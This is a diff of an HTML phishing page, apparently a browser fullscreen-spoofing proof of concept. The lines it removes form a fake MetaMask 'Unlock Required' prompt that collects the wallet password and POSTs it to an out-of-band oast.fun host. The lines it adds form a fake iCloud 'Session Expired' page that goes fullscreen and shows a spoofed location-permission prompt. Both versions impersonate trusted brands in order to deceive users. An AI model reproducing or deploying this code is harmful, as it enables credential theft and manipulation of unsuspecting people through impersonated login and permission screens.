@@ -2,101 +2,57 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>MetaMask Security Prompt</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>iCloud Session Expired</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     html, body {
-      background-color: #111;
-      color: white;
-      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
       margin: 0;
       padding: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-    }
-
-    .spoof-ui {
-      background: #1a1a1a;
-      padding: 24px;
-      border-radius: 12px;
-      box-shadow: 0 0 30px rgba(0,0,0,0.5);
-      width: 90%;
-      max-width: 360px;
+      font-family: -apple-system, sans-serif;
+      background: white;
       text-align: center;
     }
-
-    input {
-      background: #222;
-      border: none;
-      color: white;
-      padding: 12px;
-      margin: 10px 0;
-      width: 90%;
-      font-size: 16px;
-      border-radius: 8px;
+    .center {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
-
     button {
-      padding: 12px 20px;
+      padding: 12px 24px;
       font-size: 16px;
-      background-color: #4CAF50;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      margin-top: 10px;
-    }
-
-    button:hover {
-      background-color: #45a049;
+      margin-top: 20px;
     }
   </style>
 </head>
-<body onclick="enterExploit()">
-
-  <div class="spoof-ui" id="step1">
-    <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" width="64" style="margin-bottom:12px">
-    <h2>🔐 MetaMask Security Update</h2>
-    <p>Click continue to verify your wallet security</p>
-    <button>Continue</button>
+<body>
+  <div class="center">
+    <h2>🔒 Your iCloud Session has expired</h2>
+    <p>Please verify to continue.</p>
+    <button onclick="goFull()">Continue</button>
   </div>
 
   <script>
-    function enterExploit() {
-      document.body.onclick = null; // only once
+    function goFull() {
       document.documentElement.requestFullscreen().then(() => {
-        setTimeout(() => {
-          alert("⚠️ Session expired. Please re-authenticate your MetaMask wallet.");
-          showFakePrompt();
-        }, 400); // trap gesture + trust
+        // spoof UI inside fullscreen
+        document.body.innerHTML = `
+          <div class="center">
+            <h2>📍 Confirm Location Access</h2>
+            <p>We need your location to continue.</p>
+            <button onclick="triggerLocation()">Allow</button>
+          </div>
+        `;
       });
     }
 
-    function showFakePrompt() {
-      document.body.innerHTML = `
-        <div class="spoof-ui">
-          <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" width="64" style="margin-bottom:12px">
-          <h2>MetaMask Unlock Required</h2>
-          <p>Enter your wallet password to continue</p>
-          <input type="password" id="pw" placeholder="Wallet Password"><br>
-          <button onclick="steal()">Unlock</button>
-        </div>
-      `;
-    }
-
-    function steal() {
-      const pw = document.getElementById("pw").value;
-      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
-        method: "POST",
-        body: JSON.stringify({ password: pw }),
-        mode: "no-cors"
-      });
-      alert("Password submitted. Please wait...");
+    function triggerLocation() {
+      navigator.geolocation.getCurrentPosition(
+        () => alert("✅ Location access granted."),
+        () => alert("❌ Location access denied.")
+      );
     }
   </script>
-
 </body>
 </html>
